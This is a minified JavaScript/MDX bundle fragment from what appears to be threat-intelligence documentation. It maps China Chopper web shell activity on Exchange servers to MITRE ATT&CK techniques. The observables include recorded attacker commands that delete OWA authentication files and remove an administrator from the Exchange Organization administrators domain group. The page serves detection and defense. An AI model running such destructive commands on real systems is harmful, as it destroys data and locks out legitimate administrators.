IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1505.003",(0,l.kt)("br",null),"T1059.003"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"w3wp")," spawns ",(0,l.kt)("em",{parentName:"td"},"CMD")," to run delete commands."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"cmd /c cd /d C:/inetpub/wwwroot/aspnet_client&del 'E:\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\OutlookEN.aspx'&echo [S]"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"cmd /c cd /d C:/inetpub/wwwroot/aspnet_client&del 'E:\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\TimeoutLogout.aspx'&echo [S]"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1070.004",(0,l.kt)("br",null),"T1059.003"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"CMD")," executes ",(0,l.kt)("em",{parentName:"td"},"del")," commands."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"del 'E:\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\OutlookEN.aspx"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"del 'E:\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\TimeoutLogout.aspx"))))),(0,l.kt)("h3",{id:"threat-actor-used-net-group-del-commands-via-china-chopper-web-shell-to-deleted-active-directory-groups-for-impact"},"Threat Actor used ",(0,l.kt)("em",{parentName:"h3"},"net group del commands via China Chopper Web Shell")," to deleted Active Directory groups for Impact."),(0,l.kt)("h4",{id:"tactic-7"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Impact")),(0,l.kt)("h4",{id:"techniques-7"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1505.003 - Server Software Component: Web Shell"),(0,l.kt)("li",{parentName:"ul"},"T1059.003 - Command and Scripting Interpreter: Windows Command Shell"),(0,l.kt)("li",{parentName:"ul"},"T1531 - Account Access Removal")),(0,l.kt)("h4",{id:"behaviors-and-observables-7"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1505.003",(0,l.kt)("br",null),"T1059.003"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"w3wp")," spawns ",(0,l.kt)("em",{parentName:"td"},"CMD")),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'cmd /c cd /d C:\\\\inetpub\\\\wwwroot\\\\aspnet_client\\\\system_web&net group "Exchange Organization administrators" administrator /del /domain&echo [S]&cd&echo [E]'))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1531"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"CMD")," runs ",(0,l.kt)("em",{parentName:"td"},"net.exe")," commands."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'net group \\"Exchange Organization administrators\\" administrator /del /domain'))))))}k.isMDXComponent=!0}}]);